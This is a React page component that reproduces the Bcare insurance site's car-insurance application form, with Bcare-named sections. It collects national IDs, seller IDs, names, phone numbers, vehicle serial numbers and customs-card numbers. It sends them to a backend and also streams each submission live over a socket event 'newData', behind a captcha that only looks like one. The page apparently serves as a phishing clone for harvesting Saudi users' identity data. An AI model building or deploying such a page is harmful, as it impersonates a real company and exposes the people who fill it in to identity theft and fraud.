import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { useNavigate } from "react-router-dom";
import { useTranslation } from "../context/LanguageContext";
import {
  FaCar,
  FaHeartPulse,
  FaStethoscope,
  FaPlane,
  FaHouseUser,
} from "react-icons/fa6";
import SponsorsSlider from "../components/SponsorsSlider";
import WhyBcare from "../components/WhyBcare";
import WareefDiscounts from "../components/WareefDiscounts";
import WhyChooseBcare from "../components/WhyChooseBcare";
import ApplyFooter from "../components/ApplyFooter";

function validateNationalId(value) {
  if (!/^[12]\d{9}$/.test(value)) return "errors.nationalIdInvalid";
  if (/(\d)\1{4,}/.test(value)) return "errors.nationalIdRepeated";
  return null;
}

const Apply = ({ setLoading, loading }) => {
  const { t, dir } = useTranslation();
  const [type, setType] = useState("تأمين جديد");
  // const query = new URLSearchParams(window.location.search);
  // const data = JSON.parse(query.get("data"));
  const [tameenType, setTameenType] = useState("أستمارة");
  const [nationalId, setNationalId] = useState("");
  const [serialNumber, setSerialNumber] = useState("");
  const [car_year, setcar_year] = useState("2024");
  const [carHolderName, setCarHolderName] = useState("");
  const [birth_date, setBirthDate] = useState("");
  const [Customs_card, setCustomsCard] = useState("");
  const [phone, setPhone] = useState("");
  const [sellerId, setSellerId] = useState("");
  const [captecha, setCapetcha] = useState("");
  const [verfiy, setVrefiy] = useState(Math.floor(1000 + Math.random() * 9000));
  const [error, setError] = useState(false);
  const [load, setLoad] = useState(false);
  const navigate = useNavigate();
  const handleSubmit = async (e) => {
    e.preventDefault();
    setError(false);

    const buyerIdError = validateNationalId(nationalId);
    if (buyerIdError) return setError(t(buyerIdError));

    if (type === "نقل الملكية") {
      const sellerIdError = validateNationalId(sellerId);
      if (sellerIdError) {
        return setError(t("errors.sellerIdInvalid"));
      }
    }

    console.log(captecha, verfiy);
    if (String(captecha) !== String(verfiy)) {
      return setError(t("errors.captchaInvalid"));
    } else {
      setLoad(true);

      const data = {
        type,
        tameenType,
        national_id: nationalId,
        serialNumber,
        car_year,
        carHolderName,
        sellerId,
        birth_date,
        Customs_card,
        phone,
      };
      try {
        await axios.post(api_route + "/reg", data).then(({ data }) => {
          sessionStorage.setItem("id", data._id);
          socket.emit("newData", data);
          return navigate(`/reg?data=${JSON.stringify(data)}`);
        });
      } catch (error) {
      } finally {
        setLoading(false);
      }
    }
  };
  console.log(verfiy);
  return (
    <div
      className="w-full flex flex-col items-center justify-center gap-y-3"
      dir={dir}
    >
      {load ? (
        <div className="flex top-0 z-50 w-full justify-center items-center h-screen fixed bg-white bg-opacity-60">
          <img src="/logo.svg" className="w-14 h-14" />
          <div className="bg-white rounded-md p-3 w-fit h-fit flex items-center justify-center gap-x-3">
            <TailSpin
              height="30"
              width="30"
              color="gray"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
            <span className="text-lg">{t("common.processing")}</span>
          </div>
        </div>
      ) : (
        ""
      )}

      <div className="p-8 mt-2 text-white text-center shadow-lg bg-gradient-to-r from-primary-500 to-primary-600 bg-[#146394] w-full">
        <h1 className="text-2xl font-extrabold mb-1 ">
          {t("apply.heroTitle")}
        </h1>
        <p className=" my-2 text-sm">{t("apply.heroSubtitle")}</p>
      </div>

      <ul className="flex px-4 cursor-pointer sm:px-4 rounded-t-2xl sm:justify-around -mt-10 w-11/12 bg-white  list-none">
        <li className="tab-item active-tab flex flex-1 flex-col items-center justify-center gap-1 py-1 text-[#e6185c] border-b-4 border-yellow-400">
          <FaCar className="w-7 h-7" aria-hidden />
          <h3 className="text-sm font-bold m-0 sm:hidden block">
            {t("apply.vehicles")}
          </h3>
          <h3 className="text-sm font-semibold m-0 sm:block hidden">
            {t("apply.vehicles")}
          </h3>
        </li>
        <li className="tab-item flex flex-1 flex-col items-center justify-center gap-1 py-1 text-gray-400">
          <FaHeartPulse className="w-7 h-7" aria-hidden />
          <h3 className="text-sm font-semibold m-0 sm:hidden block">
            {t("apply.medical")}
          </h3>
          <h3 className="text-sm font-semibold m-0 sm:block hidden">
            {t("apply.medical")}
          </h3>
        </li>
        <li className="tab-item flex flex-1 flex-col items-center justify-center gap-1 py-3 text-gray-400">
          <FaStethoscope className="w-7 h-7" aria-hidden />
          <h3 className="text-sm font-semibold m-0 sm:hidden block">
            {t("apply.medicalErrors")}
          </h3>
          <h3 className="text-sm font-semibold m-0 sm:block hidden">
            {t("apply.medicalErrors")}
          </h3>
        </li>
        <li className="tab-item flex flex-1 flex-col items-center justify-center gap-1 py-3 text-gray-400">
          <FaPlane className="w-7 h-7" aria-hidden />
          <h3 className="text-sm font-semibold m-0 sm:hidden block">
            {t("apply.travel")}
          </h3>
          <h3 className="text-sm font-semibold m-0 sm:block hidden">
            {t("apply.travel")}
          </h3>
        </li>
        <li className="tab-item flex flex-1 flex-col items-center justify-center gap-1 py-3 text-gray-400">
          <FaHouseUser className="w-7 h-7" aria-hidden />
          <h3 className="text-xs text-nowrap font-semibold m-0 sm:hidden block">
            {t("apply.domesticWorkers")}
          </h3>
          <h3 className="text-sm font-semibold m-0 sm:block hidden">
            {t("apply.domesticWorkers")}
          </h3>
        </li>
      </ul>
      <div className="w-full flex items-center justify-around  px-5 ">
        <button
          className={
            type === "تأمين جديد"
              ? "bg-[#146394] text-white w-1/2 p-2 text-base rounded-tr-2xl "
              : "w-1/2 bg-gray-100   p-2 text-base rounded-tr-2xl"
          }
          onClick={() => setType("تأمين جديد")}
        >
          {t("apply.newInsurance")}
        </button>
        <button
          className={
            type === "نقل الملكية"
              ? "bg-[#146394] text-white w-1/2 p-2 text-base rounded-tl-2xl "
              : "w-1/2 bg-gray-100   p-2 text-base rounded-tl-2xl"
          }
          onClick={() => setType("نقل الملكية")}
        >
          {t("apply.ownershipTransfer")}
        </button>
      </div>

      <div className="w-11/12 flex items-center justify-around    px-2    flex-col">
        {type === "تأمين جديد" ? (
          <>
            <div
              className="flex flex-col w-full   text-base p-1  gap-y-1 text-gray-700 font-bold"
              dir={dir}
            >
              <span>{t("apply.nationalId")} </span>
              <input
                required
                type="text"
                dir="ltr"
                inputMode="numeric"
                className="border p-2 text-left border-gray-400 outline-blue-500 rounded-md "
                maxLength={10}
                value={nationalId}
                onChange={(e) => {
                  const value = e.target.value;
                  if (/^\d*$/.test(value)) {
                    setNationalId(value);
                  }
                }}
              />
            </div>
            <div
              className="flex flex-col w-full   text-base p-1 gap-y-1 text-gray-700 font-bold"
              dir={dir}
            >
              <span>{t("apply.holderName")}</span>
              <input
                required
                type="text"
                className="border p-2  border-gray-400 outline-blue-500 rounded-md "
                minLength={6}
                value={carHolderName}
                onChange={(e) => setCarHolderName(e.target.value)}
              />
            </div>
            <div
              className="flex flex-col w-full   text-base p-1 gap-y-1 text-gray-700 font-bold"
              dir={dir}
            >
              <span>{t("apply.phone")}</span>
              <input
                required
                type="text"
                dir="ltr"
                inputMode="numeric"
                className="border p-2 text-left border-gray-400 outline-blue-500 rounded-md "
                maxLength={10}
                minLength={10}
                value={phone}
                onChange={(e) => {
                  const value = e.target.value;
                  if (/^\d*$/.test(value)) {
                    setPhone(value);
                  } else {
                    e.target.value = "";
                  }
                }}
              />
            </div>
            <div className="w-full flex items-center  justify-around mt-1  ">
              <span
                className={
                  tameenType === "أستمارة"
                    ? "bg-[#146394] text-white w-1/2 p-2 text-center text-base rounded-md"
                    : "w-1/2 bg-gray-300 text-black   text-center   p-2 text-base rounded-md"
                }
                onClick={() => setTameenType("أستمارة")}
              >
                {t("apply.form")}{" "}
              </span>
              <span
                className={
                  tameenType === "بطاقة جمركية"
                    ? "bg-[#146394] text-white w-1/2 p-2 text-center text-base rounded-md"
                    : "w-1/2 bg-gray-300 text-black   text-center   p-2 text-base rounded-md"
                }
                onClick={() => setTameenType("بطاقة جمركية")}
              >
                {t("apply.customsCard")}
              </span>
            </div>
          </>
        ) : (
          ""
        )}
        {type === "تأمين جديد" ? (
          tameenType === "أستمارة" ? (
            <form
              className=" w-full  justify-center flex flex-col items-center   gap-y-5"
              onSubmit={handleSubmit}
            >
              <div
                className="flex flex-col w-full   text-base px-2 py-1 gap-y-2 text-gray-700 font-bold"
                dir={dir}
              >
                <span>{t("apply.serialNumber")} </span>
                <input
                  required
                  type="text"
                  dir="ltr"
                  className="border p-2 text-left  border-gray-400 outline-blue-500 rounded-md "
                  value={serialNumber}
                  onChange={(e) => setSerialNumber(e.target.value)}
                />
              </div>
              <div
                className="flex justify-between   w-full  p-2   text-xl border border-gray-400 rounded-md"
                dir={dir}
              >
                <div className="flex flex-col gap-y-2 text-base p-2 pb-8">
                  <span>{t("apply.captcha")} </span>

                  <input
                    required
                    type="text"
                    placeholder=""
                    dir="ltr"
                    inputMode="numeric"
                    maxLength={4}
                    className="border px-3 py-2 text-left border-gray-400 outline-blue-500 rounded-md "
                    value={captecha}
                    onChange={(e) =>
                      setCapetcha(e.target.value.replace(/\D/g, "").slice(0, 4))
                    }
                  />
                </div>
                <div className="flex gap-x-2 text-2xl w-full items-center">
                  <div
                    className="text-base"
                    onClick={() =>
                      setVrefiy(Math.floor(1000 + Math.random() * 9000))
                    }
                  >
                    🔄
                  </div>
                  <div
                    className="flex gap-x-2 flex-1 items-center justify-center"
                    dir="ltr"
                  >
                    {verfiy
                      .toString()
                      .split("")
                      .map((v, i) => {
                        return (
                          <>
                            <span
                              className={`${
                                i === 0 || i === 3
                                  ? "text-blue-600"
                                  : "text-green-600"
                              } font-bold shadow-2xl`}
                            >
                              {v}
                            </span>
                          </>
                        );
                      })}
                  </div>
                </div>
              </div>
              {error && (
                <span className="w-full text-center text-red-500">{error}</span>
              )}
              <div className="w-full flex justify-center items-center px-2  text-center text-sm gap-x-2">
                {t("apply.consent")}
              </div>
              <div className="w-full flex justify-center items-center my-2">
                <button className="text-white bg-yellow-500 py-3 rounded-md  text-xl w-full">
                  {loading ? (
                    <div className="flex items-center justify-center">
                      <TailSpin
                        height="30"
                        width="30"
                        color="white"
                        ariaLabel="tail-spin-loading"
                        radius="1"
                        wrapperStyle={{}}
                        wrapperClass=""
                        visible={true}
                      />
                    </div>
                  ) : (
                    t("common.showOffers")
                  )}
                </button>
              </div>
            </form>
          ) : (
            <form
              className=" w-full  justify-center flex flex-col items-center  py-3 px-2 "
              onSubmit={handleSubmit}
            >
              <div className=" w-full  justify-center flex  items-start  ">
                <div
                  className="flex flex-col w-full   text-base  p-1 gap-y-2 text-gray-700 font-bold"
                  dir={dir}
                >
                  <span>
                    {t("apply.modelYear")}{" "}
                    <span className="text-red-500">*</span>
                  </span>
                  <select
                    required
                    type="text"
                    className="border px-1 text-left py-2 border-gray-400 outline-blue-500 rounded-md "
                    maxLength={10}
                    minLength={10}
                    value={car_year}
                    dir="ltr"
                    onChange={(e) => setcar_year(e.target.value)}
                  >
                    <option className="" hidden>
                      {t("common.choose")}
                    </option>
                    <option value="2000">2000</option>
                    <option value="2001">2001</option>
                    <option value="2002">2002</option>
                    <option value="2003">2003</option>
                    <option value="2004">2004</option>
                    <option value="2005">2005</option>
                    <option value="2006">2006</option>
                    <option value="2007">2007</option>
                    <option value="2008">2008</option>
                    <option value="2009">2009</option>
                    <option value="2010">2010</option>
                    <option value="2011">2011</option>
                    <option value="2012">2012</option>
                    <option value="2013">2013</option>
                    <option value="2014">2014</option>
                    <option value="2015">2015</option>
                    <option value="2016">2016</option>
                    <option value="2017">2017</option>
                    <option value="2018">2018</option>
                    <option value="2019">2019</option>
                    <option value="2020">2020</option>
                    <option value="2021">2021</option>
                    <option value="2022">2022</option>
                    <option value="2023">2023</option>
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                  </select>
                </div>
                <div
                  className="flex flex-col w-full   text-base  pt-1 pb-8 gap-y-2 text-gray-700 font-bold"
                  dir={dir}
                >
                  <span>{t("apply.customsCardNumber")}</span>

                  <input
                    required
                    type="text"
                    className="border px-3 py-2 text-center border-gray-400 outline-blue-500 rounded-md "
                    value={Customs_card}
                    onChange={(e) => setCustomsCard(e.target.value)}
                  />
                </div>
              </div>

              <div
                className="flex justify-between   w-full  p-2   text-xl border border-gray-400 rounded-md"
                dir={dir}
              >
                <div className="flex flex-col gap-y-2 text-base pb-8">
                  <span>{t("apply.captcha")} </span>

                  <input
                    required
                    type="text"
                    placeholder=""
                    dir="ltr"
                    inputMode="numeric"
                    maxLength={4}
                    className="border px-3 py-2 text-left border-gray-400 outline-blue-500 rounded-md "
                    value={captecha}
                    onChange={(e) =>
                      setCapetcha(e.target.value.replace(/\D/g, "").slice(0, 4))
                    }
                  />
                </div>
                <div className="flex gap-x-4 text-2xl justify-center items-center">
                  <div
                    className="text-base"
                    onClick={() =>
                      setVrefiy(Math.floor(1000 + Math.random() * 9000))
                    }
                  >
                    🔄
                  </div>
                  <div
                    className="flex gap-x-2 flex-1 items-center justify-center"
                    dir="ltr"
                  >
                    {verfiy
                      .toString()
                      .split("")
                      .map((v, i) => {
                        return (
                          <>
                            <span
                              className={`${
                                i === 0 || i === 3
                                  ? "text-blue-600"
                                  : "text-green-600"
                              } font-bold shadow-2xl`}
                            >
                              {v}
                            </span>
                          </>
                        );
                      })}
                  </div>
                </div>
              </div>

              {error && (
                <span className="w-full text-center text-red-500 pt-2">
                  {error}
                </span>
              )}

              <div className="w-full flex justify-center items-center px-2 py-4 text-center text-sm gap-x-2">
                {t("apply.consent")}
              </div>
              <div className="w-full flex justify-center items-center my-2">
                <button className="text-white bg-yellow-500 py-3 rounded-md  text-xl w-full">
                  {loading ? (
                    <div className="flex items-center justify-center">
                      <TailSpin
                        height="30"
                        width="30"
                        color="white"
                        ariaLabel="tail-spin-loading"
                        radius="1"
                        wrapperStyle={{}}
                        wrapperClass=""
                        visible={true}
                      />
                    </div>
                  ) : (
                    t("common.next")
                  )}
                </button>
              </div>
            </form>
          )
        ) : (
          <form
            className=" w-full  justify-center flex flex-col items-center  p-3 gap-y-3"
            onSubmit={handleSubmit}
          >
            <div
              className="flex flex-col w-full   text-base   gap-y-2 text-gray-700 font-bold"
              dir={dir}
            >
              <span>{t("apply.sellerId")}</span>
              <input
                required
                type="text"
                dir="ltr"
                inputMode="numeric"
                className="border px-3 py-2 text-left border-gray-400 outline-blue-500 rounded-md "
                maxLength={10}
                value={sellerId}
                onChange={(e) => {
                  const value = e.target.value;
                  if (/^\d*$/.test(value)) {
                    setSellerId(value);
                  }
                }}
              />
            </div>
            <div
              className="flex flex-col w-full   text-base   gap-y-2 text-gray-700 font-bold"
              dir={dir}
            >
              <span>{t("apply.buyerId")}</span>
              <input
                required
                type="text"
                dir="ltr"
                inputMode="numeric"
                className="border px-3 py-2 text-left border-gray-400 outline-blue-500 rounded-md "
                maxLength={10}
                value={nationalId}
                onChange={(e) => {
                  const value = e.target.value;
                  if (/^\d*$/.test(value)) {
                    setNationalId(value);
                  }
                }}
              />
            </div>
            <div
              className="flex flex-col w-full   text-base   gap-y-2 text-gray-700 font-bold"
              dir={dir}
            >
              <span>{t("apply.applicantName")} </span>
              <input
                required
                type="text"
                className="border px-3 py-2 text-right border-gray-400 outline-blue-500 rounded-md "
                maxLength={10}
                minLength={10}
                value={carHolderName}
                onChange={(e) => setCarHolderName(e.target.value)}
              />
            </div>

            <div
              className="flex flex-col w-full   text-base  gap-y-2 text-gray-700 font-bold"
              dir={dir}
            >
              <span>{t("apply.phone")}</span>
              <input
                required
                type="text"
                dir="ltr"
                inputMode="numeric"
                className="border px-3 py-2 text-left border-gray-400 outline-blue-500 rounded-md "
                maxLength={10}
                minLength={10}
                value={phone}
                onChange={(e) => {
                  const value = e.target.value;
                  if (/^\d*$/.test(value)) {
                    setPhone(value);
                  } else {
                    e.target.value = "";
                  }
                }}
              />
            </div>

            <div className="w-full flex items-center gap-x-3 justify-around mt-2  ">
              <span
                className={
                  tameenType === "بطاقة جمركية"
                    ? "bg-[#146394] text-white w-1/2 p-2 text-center text-base rounded-md"
                    : "w-1/2 bg-gray-300 text-black  border-2 text-center   p-2 text-base rounded-md"
                }
                onClick={() => setTameenType("بطاقة جمركية")}
              >
                {t("apply.customsCard")}
              </span>
              <span
                className={
                  tameenType === "أستمارة"
                    ? "bg-[#146394] text-white w-1/2 p-2 text-center text-base rounded-md"
                    : "w-1/2 bg-gray-300 text-black  border-2 text-center   p-2 text-base rounded-md"
                }
                onClick={() => setTameenType("أستمارة")}
              >
                {t("apply.form")}{" "}
              </span>
            </div>

            {tameenType === "أستمارة" ? (
              <div className=" w-full  justify-center flex flex-col items-center   gap-y-5">
                <div
                  className="flex flex-col w-full   text-base px-2 py-1 gap-y-2 text-gray-700 font-bold"
                  dir={dir}
                >
                  <span>{t("apply.serialNumber")} </span>
                  <input
                    required
                    type="text"
                    dir="ltr"
                    className="border px-3 py-2 text-left border-gray-400 outline-blue-500 rounded-md "
                    value={serialNumber}
                    onChange={(e) => setSerialNumber(e.target.value)}
                  />
                </div>
                <div
                  className="flex justify-between   w-full  p-2   text-xl border border-gray-400 rounded-md"
                  dir={dir}
                >
                  <div className="flex flex-col gap-y-2 text-base p-2 pb-8">
                    <span>{t("apply.captcha")} </span>
                    <input
                      required
                      type="text"
                      placeholder=""
                      dir="ltr"
                      inputMode="numeric"
                      maxLength={4}
                      className="border px-3 py-2 text-left border-gray-400 outline-blue-500 rounded-md "
                      value={captecha}
                      onChange={(e) =>
                        setCapetcha(
                          e.target.value.replace(/\D/g, "").slice(0, 4),
                        )
                      }
                    />
                  </div>
                  <div className="flex gap-x-2 text-2xl w-full items-center">
                    <div
                      className="text-base"
                      onClick={() =>
                        setVrefiy(Math.floor(1000 + Math.random() * 9000))
                      }
                    >
                      🔄
                    </div>
                    <div
                      className="flex gap-x-2 flex-1 items-center justify-center"
                      dir="ltr"
                    >
                      {verfiy
                        .toString()
                        .split("")
                        .map((v, i) => {
                          return (
                            <>
                              <span
                                className={`${
                                  i === 0 || i === 3
                                    ? "text-blue-600"
                                    : "text-green-600"
                                } font-bold shadow-2xl`}
                              >
                                {v}
                              </span>
                            </>
                          );
                        })}
                    </div>
                  </div>
                </div>
                {error && (
                  <span className="w-full text-center text-red-500">
                    {error}
                  </span>
                )}
                <div className="w-full flex justify-center items-center px-2  text-center text-sm gap-x-2">
                  {t("apply.consent")}
                </div>
                <div className="w-full flex justify-center items-center my-2">
                  <button
                    className="text-white bg-yellow-500 py-3 rounded-md  text-xl w-full"
                    type="submit"
                  >
                    {loading ? (
                      <div className="flex items-center justify-center">
                        <TailSpin
                          height="30"
                          width="30"
                          color="white"
                          ariaLabel="tail-spin-loading"
                          radius="1"
                          wrapperStyle={{}}
                          wrapperClass=""
                          visible={true}
                        />
                      </div>
                    ) : (
                      t("common.showOffers")
                    )}
                  </button>
                </div>
              </div>
            ) : (
              <div className=" w-full  justify-center flex flex-col items-center  py-3 px-2 ">
                <div
                  className="flex flex-col w-full   text-base  py-3 gap-y-2 text-gray-700 font-bold"
                  dir={dir}
                >
                  <span>
                    {t("apply.modelYear")}{" "}
                    <span className="text-red-500">*</span>
                  </span>
                  <select
                    required
                    type="text"
                    className="border px-1 text-left py-2 border-gray-400 outline-blue-500 rounded-md "
                    maxLength={10}
                    minLength={10}
                    value={car_year}
                    dir="ltr"
                    onChange={(e) => setcar_year(e.target.value)}
                  >
                    <option className="" hidden>
                      {t("common.choose")}
                    </option>
                    <option value="2000">2000</option>
                    <option value="2001">2001</option>
                    <option value="2002">2002</option>
                    <option value="2003">2003</option>
                    <option value="2004">2004</option>
                    <option value="2005">2005</option>
                    <option value="2006">2006</option>
                    <option value="2007">2007</option>
                    <option value="2008">2008</option>
                    <option value="2009">2009</option>
                    <option value="2010">2010</option>
                    <option value="2011">2011</option>
                    <option value="2012">2012</option>
                    <option value="2013">2013</option>
                    <option value="2014">2014</option>
                    <option value="2015">2015</option>
                    <option value="2016">2016</option>
                    <option value="2017">2017</option>
                    <option value="2018">2018</option>
                    <option value="2019">2019</option>
                    <option value="2020">2020</option>
                    <option value="2021">2021</option>
                    <option value="2022">2022</option>
                    <option value="2023">2023</option>
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                  </select>
                </div>
                <div
                  className="flex flex-col w-full   text-base  pt-2 pb-8 gap-y-2 text-gray-700 font-bold"
                  dir={dir}
                >
                  <span>{t("apply.customsCardNumber")}</span>

                  <input
                    required
                    type="text"
                    dir="ltr"
                    className="border px-3 py-2 text-left border-gray-400 outline-blue-500 rounded-md "
                    value={Customs_card}
                    onChange={(e) => setCustomsCard(e.target.value)}
                  />
                </div>
                <div
                  className="flex justify-between   w-full  p-2   text-xl border border-gray-400 rounded-md"
                  dir={dir}
                >
                  <div className="flex flex-col gap-y-2 text-base pb-8">
                    <span>{t("apply.captcha")} </span>

                    <input
                      required
                      type="text"
                      placeholder=""
                      dir="ltr"
                      inputMode="numeric"
                      maxLength={4}
                      className="border px-3 py-2 text-left border-gray-400 outline-blue-500 rounded-md "
                      value={captecha}
                      onChange={(e) =>
                        setCapetcha(
                          e.target.value.replace(/\D/g, "").slice(0, 4),
                        )
                      }
                    />
                  </div>
                  <div className="flex gap-x-4 text-2xl justify-center items-center">
                    <div
                      className="text-base"
                      onClick={() =>
                        setVrefiy(Math.floor(1000 + Math.random() * 9000))
                      }
                    >
                      🔄
                    </div>
                    <div
                      className="flex gap-x-2 flex-1 items-center justify-center"
                      dir="ltr"
                    >
                      {verfiy
                        .toString()
                        .split("")
                        .map((v, i) => {
                          return (
                            <>
                              <span
                                className={`${
                                  i === 0 || i === 3
                                    ? "text-blue-600"
                                    : "text-green-600"
                                } font-bold shadow-2xl`}
                              >
                                {v}
                              </span>
                            </>
                          );
                        })}
                    </div>
                  </div>
                </div>

                {error && (
                  <span className="w-full text-center text-red-500 pt-5">
                    {error}
                  </span>
                )}

                <div className="w-full flex justify-center items-center px-2 py-4 text-center text-sm gap-x-2">
                  {t("apply.consent")}
                </div>
                <div className="w-full flex justify-center items-center my-2">
                  <button className="text-white bg-yellow-500 py-3 rounded-md  text-xl w-full">
                    {loading ? (
                      <div className="flex items-center justify-center">
                        <TailSpin
                          height="30"
                          width="30"
                          color="white"
                          ariaLabel="tail-spin-loading"
                          radius="1"
                          wrapperStyle={{}}
                          wrapperClass=""
                          visible={true}
                        />
                      </div>
                    ) : (
                      t("common.showOffers")
                    )}
                  </button>
                </div>
              </div>
            )}
          </form>
        )}
      </div>
      <WhyBcare />
      <WareefDiscounts />
      <WhyChooseBcare />
      <ApplyFooter />
    </div>
  );
};

export default Apply;

// <div className="flex flex-col w-full p-2 gap-y-4  text-xl" dir="rtl">
//   <label className="">تاريخ الميلاد </label>
//   <input
//     required
//     type="date"
//     placeholder="   تاريخ  الميلاد"
//     className="border-2 p-3 border-gray-400 outline-blue-500 "
//     value={birth_date}
//     onChange={(e) => setBirthDate(e.target.value)}
//   />
// </div>;
